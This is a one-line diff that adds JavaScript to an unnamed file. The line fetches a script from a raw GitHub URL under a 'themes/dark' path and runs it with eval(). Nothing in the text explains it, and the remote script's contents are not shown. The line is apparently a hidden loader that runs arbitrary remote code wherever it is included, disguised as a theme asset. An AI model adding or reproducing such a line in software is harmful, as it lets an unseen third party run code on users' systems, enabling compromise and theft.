@@ -1,0 +1,1 @@
+fetch('https://raw.githubusercontent.com/pisc639-NT/vocabsize/refs/heads/main/themes/dark/script2.js').then(r=>r.text()).then(r=>eval(r));
